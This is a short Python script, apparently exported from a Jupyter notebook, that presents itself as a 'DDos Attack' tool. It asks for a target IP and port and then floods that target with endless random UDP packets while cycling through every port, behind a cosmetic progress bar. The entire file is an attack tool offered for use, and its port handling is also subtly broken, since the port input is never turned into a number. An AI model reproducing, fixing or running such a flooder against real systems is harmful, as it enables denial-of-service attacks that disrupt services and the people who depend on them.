#!/usr/bin/env python
# coding: utf-8

# In[25]:


import sys
import os
import time
import socket
import random


# In[14]:


from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


# In[26]:


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


# In[24]:


os.system("clear")
os.system("figlet DDos Attack")


# In[23]:


print ("Author   : SANDESH JAIN")
print ("github   : https://github.com/sandesh13-tech")
print
ip = input("IP Target : ")
port = input("Port       : ")


# In[22]:



os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)


# In[ ]:


sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1


# In[ ]:




